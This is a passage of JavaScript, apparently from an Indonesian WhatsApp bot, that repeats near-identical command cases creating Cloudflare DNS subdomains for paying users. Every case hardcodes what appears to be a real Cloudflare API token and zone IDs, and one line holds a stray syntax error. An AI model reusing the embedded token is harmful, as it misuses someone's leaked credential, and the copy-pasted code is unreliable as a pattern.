                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Developer_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain10': {
           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d41a17e101c0f89f0aec609c31137f91";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "sellerpannel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rioo STORE_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain11': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d877d9cf996ac8a1b371851e733ba20e";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelku.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Developer_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain12': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f58970b468ab2eb4c3a546c0e37680e0";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelku.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Developer_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
           case 'domain13': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "92fffa5f2cce4005a30e3950620cb97d";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "putraoffc.site";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Developer_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
        
        break
           case 'domain14': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e03420325af30aaed049cbcc4c3381ed";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "putraoffc.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Developer_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain15': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba86d80050aa5a2343a8e456c85c32f0";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "kangpannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");f
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Developer_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain16': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "deb75eb2d37b30e954684a3db7f1e323";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannelku.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Developer_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain17': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "06a3fe4e7eec313be8ef30b744fcfeb3";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelmurah.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Developer_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain18': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "04f62c54a011fe7929342bde68c6deb3";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "storepannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Developer_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain19': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "cc152c1a6c73b934af4e3c71d47f15db";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "tokopannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Developer_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain20': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5efd37e4f4f1186ca6a92d6366b8d485";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannel.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Developer_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain21': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3b103a544abad82f68f03395cf8effda";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "adminpannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Developer_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain22': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "10bf5f40f9e6fe74fe5647c2b143de3a";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannel.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Official_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain23': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5c38f987cf217bfe2bf682d5bb310fe8";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "tokocpannelmurah.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Developer_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain24': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "736705fd97bebdf03ca4a007c2ca4a8f";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "websitepannelmurah.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
